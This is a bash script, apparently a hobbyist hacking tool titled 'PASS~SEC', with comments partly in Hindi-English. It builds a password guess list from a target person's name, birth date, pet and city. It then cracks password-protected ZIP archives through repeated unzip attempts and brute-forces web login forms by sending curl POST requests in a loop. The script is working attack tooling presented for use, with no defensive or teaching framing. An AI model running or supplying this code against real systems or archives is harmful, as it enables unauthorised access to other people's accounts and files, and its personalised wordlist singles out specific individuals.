#!/bin/bash
# This is a comment
RED='\033[1;31m'
NC='\033[0m'


echo -e "${RED}"
figlet -f slant "PASS~SEC"
echo -e "${NC}"


echo -e "                                                
                                               \e[34mVersion: 10.2\e[0m"

generate_wordlist() {
    local outfile="$1"

    read -p "[?] First name  : " first
    read -p "[?] Last name   : " last
    read -p "[?] DOB (DDMMYYYY): " dob
    read -p "[?] Pet name    : " pet
    read -p "[?] City        : " city
    read -p "[?] Extra words (comma separated): " extras

    # Base words collect karo
    base=("$first" "$last" "$pet" "$city")
    for w in ${extras//,/ }; do base+=("$w"); done

    # Numbers list banao
    nums=("123" "1234" "12345" "007" "69" "911")
    [[ -n "$dob" ]] && nums+=("$dob" "${dob:0:2}" "${dob:2:2}" "${dob:4}" "${dob:6}")

    specials=("!" "@" "#" "\$" "@123" "!123")

    # Capitalize helper
    cap() { echo "${1^}"; }

    > "$outfile"

    for w in "${base[@]}"; do
        [[ -z "$w" ]] && continue
        wl=$(cap "$w")
        echo "$w" >> "$outfile"
        echo "$wl" >> "$outfile"

        # word + number
        for n in "${nums[@]}"; do
            echo "$w$n" >> "$outfile"
            echo "$wl$n" >> "$outfile"
        done

        # word + special
        for s in "${specials[@]}"; do
            echo "$w$s" >> "$outfile"
            echo "$wl$s" >> "$outfile"
        done
    done

    # Two-word combos (first+last, first+pet, etc.)
    for a in "${base[@]}"; do
        [[ -z "$a" ]] && continue
        for b in "${base[@]}"; do
            [[ -z "$b" || "$a" == "$b" ]] && continue
            echo "$a$b" >> "$outfile"
            echo "$(cap "$a")$(cap "$b")" >> "$outfile"
            [[ -n "$dob" ]] && echo "$a$b${dob:4}" >> "$outfile"
        done
    done

    # Deduplicate + count
    sort -u "$outfile" -o "$outfile"
    count=$(wc -l < "$outfile")
    echo -e "${GREEN}[+] $count passwords saved -> $outfile${NC}"
}

# ---------- ZIP Cracker ----------
crack_zip() {
    local zipfile="$1" wordlist="$2"

    command -v unzip >/dev/null || { echo -e "${RED}[-] 'unzip' installed nahi hai: apt install unzip${NC}"; return 1; }
    [[ -f "$zipfile" ]] || { echo -e "${RED}[-] File nahi mili: $zipfile${NC}"; return 1; }

    echo -e "${YELLOW}[*] Cracking $zipfile ...${NC}"
    total=$(wc -l < "$wordlist"); i=0

    while IFS= read -r pwd; do
        ((i++))
        # Test: bad password pe stderr aata hai
        if unzip -o -P "$pwd" -t "$zipfile" >/dev/null 2>&1; then
            echo -e "\n${GREEN}[✓] PASSWORD FOUND: $pwd${NC}"
            echo "$pwd" > .cracked_password
            return 0
        fi
        (( i % 50 == 0 )) && printf "\r[*] Tried %d/%d" "$i" "$total"
    done < "$wordlist"

    echo -e "\n${RED}[-] Password wordlist me nahi mila.${NC}"
    return 1
}

# ---------- HTTP Login Cracker ----------
crack_http() {
    local url="$1" user="$2" wordlist="$3" failstr="$4"

    command -v curl >/dev/null || { echo -e "${RED}[-] 'curl' installed nahi hai.${NC}"; return 1; }
    [[ -z "$failstr" ]] && read -p "[?] Failed-login response text (e.g. 'invalid'): " failstr

    echo -e "${YELLOW}[*] Brute-forcing $url (user: $user) ...${NC}"
    total=$(wc -l < "$wordlist"); i=0

    while IFS= read -r pwd; do
        ((i++))
        # NOTE: 'username'/'password' field names apne target form ke hisaab se badlo
        resp=$(curl -s -m 10 -d "username=$user&password=$pwd" "$url")

        if [[ "$resp" != *"$failstr"* ]]; then
            echo -e "\n${GREEN}[✓] PASSWORD FOUND: $pwd${NC}"
            return 0
        fi
        (( i % 20 == 0 )) && printf "\r[*] Tried %d/%d" "$i" "$total"
    done < "$wordlist"

    echo -e "\n${RED}[-] Password wordlist me nahi mila.${NC}"
    return 1
}

# ---------- Main Menu ----------
echo "======================================"
echo "   Combo Password Tool (Bash)"
echo "======================================"
echo "1) Generate wordlist"
echo "2) Crack ZIP file"
echo "3) Crack HTTP login"
echo "4) Generate + Crack ZIP"
echo "5) Exit"
read -p "[?] Choose: " choice

case "$choice" in
    1)
        read -p "[?] Output file [wordlist.txt]: " out
        out=${out:-wordlist.txt}
        generate_wordlist "$out"
        ;;
    2)
        read -p "[?] ZIP file path: " zf
        read -p "[?] Wordlist [wordlist.txt]: " wl
        crack_zip "$zf" "${wl:-wordlist.txt}"
        ;;
    3)
        read -p "[?] Login URL: " url
        read -p "[?] Username: " user
        read -p "[?] Wordlist [wordlist.txt]: " wl
        crack_http "$url" "$user" "${wl:-wordlist.txt}" ""
        ;;
    4)
        read -p "[?] ZIP file path: " zf
        generate_wordlist /tmp/combo_wl.txt
        crack_zip "$zf" /tmp/combo_wl.txt
        ;;
    *) echo "Bye!"; exit 0 ;;
esac
